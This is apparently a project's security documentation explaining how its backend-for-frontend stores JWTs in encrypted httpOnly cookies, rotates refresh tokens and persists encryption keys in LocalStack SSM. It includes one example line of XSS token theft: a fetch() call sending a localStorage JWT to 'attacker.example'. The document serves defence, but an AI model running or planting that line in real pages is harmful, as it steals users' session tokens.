# JWT, Cookies & Session Security

This document explains how BookingDojo handles authentication tokens — why a raw JWT in the browser is dangerous, how the BFF pattern fixes it, and what makes the session survive a server restart.

---

## The Problem: JWT in the Browser

A common pattern is to store a JWT in `localStorage` after login and attach it to every request as `Authorization: Bearer <token>`. This is simple, but it creates a persistent XSS target.

If any JavaScript on the page can run — via a stored XSS payload, a compromised npm package, a browser extension — it can read `localStorage` and exfiltrate the token:

```js
fetch('https://attacker.example/steal?t=' + localStorage.getItem('jwt'))
```

The token is then valid until it expires. The attacker has a silent, persistent session with no indication to the user.

---

## The Fix: Encrypted httpOnly Cookie

BookingDojo uses a **BFF (Backend For Frontend)**. After login:

1. The BFF calls the API and receives a JWT and a refresh token
2. The BFF encrypts both into a single cookie using **ASP.NET Core Data Protection**
3. The cookie is set with `httpOnly=true` — JavaScript cannot read it at all

```
Set-Cookie: bd_token=<encrypted blob>; HttpOnly; SameSite=Lax
```

The encrypted blob is opaque: it contains the JWT and refresh token but is protected with AES-256-CBC + HMACSHA256. Without the Data Protection key ring, it cannot be decrypted.

Even if an XSS payload runs, `document.cookie` does not include `httpOnly` cookies. There is nothing to steal.

---

## Token Lifecycle

```
Login
  │
  ├─ API issues JWT (15-minute expiry) + refresh token (7-day expiry)
  │
  ├─ BFF encrypts both into bd_token cookie
  │
  └─ Cookie sent to browser (httpOnly, never readable by JS)

Every request
  │
  ├─ Browser sends bd_token cookie automatically
  │
  ├─ BFF decrypts cookie → extracts JWT
  │
  └─ BFF forwards request to API with Authorization: Bearer <jwt>

JWT expired (after 15 min)
  │
  ├─ API returns 401
  │
  ├─ BFF uses refresh token to get new JWT from API
  │
  ├─ API rotates refresh token (old one revoked, new one issued)
  │
  └─ BFF re-encrypts new JWT + new refresh token → new cookie

Refresh token reuse detected
  │
  ├─ BFF presents a refresh token that has already been revoked
  │
  ├─ API revokes ALL active sessions for that user (token family)
  │
  └─ User is fully logged out — attacker's stolen token is also invalidated
```

---

## Why Refresh Token Rotation Matters

A stolen refresh token is only useful once. The moment the legitimate user's next request rotates it, the stolen copy becomes invalid. If the attacker uses the stolen copy first:

- The API detects reuse of a revoked token
- All active sessions for the user are revoked immediately
- The user is logged out and prompted to log back in

This limits the window of damage from a stolen session.

---

## Why Keys Must Persist: LocalStack SSM

ASP.NET Core Data Protection generates an encryption key ring on first run. By default, keys are stored in memory — lost when the process restarts. After a restart:

- The BFF generates new keys
- Existing `bd_token` cookies were encrypted with the old keys
- The BFF cannot decrypt them → every user is logged out on server restart

BookingDojo stores the key ring in **LocalStack SSM** (a local emulator of AWS Systems Manager Parameter Store) under `/bookingdojo/bff/dp-keys`. The keys survive restarts and would be shared across multiple BFF instances in a scaled deployment.

The relevant configuration in `src/BookingDojo.Bff/Program.cs`:

```csharp
builder.Services.AddAWSService<IAmazonSimpleSystemsManagement>(new AWSOptions
{
    Credentials = new BasicAWSCredentials("test", "test"),
    Region = Amazon.RegionEndpoint.USEast1,
    DefaultClientConfig = { ServiceURL = "http://localhost:4566" }
});

builder.Services.AddDataProtection()
    .PersistKeysToAWSSystemsManager("/bookingdojo/bff/dp-keys")
    .SetApplicationName("BookingDojo.Bff");
```

LocalStack runs as part of `docker compose up -d`. Without it running, the BFF falls back to in-memory keys and sessions are lost on restart.

---

## Summary

| Concern | Approach |
|---------|----------|
| XSS token theft | `httpOnly` cookie — JS cannot read it |
| Cookie tampering | AES-256-CBC + HMACSHA256 via Data Protection |
| Short JWT expiry | 15 minutes, refreshed transparently |
| Stolen refresh token | Token rotation + reuse detection revokes all sessions |
| Key loss on restart | Keys stored in LocalStack SSM |
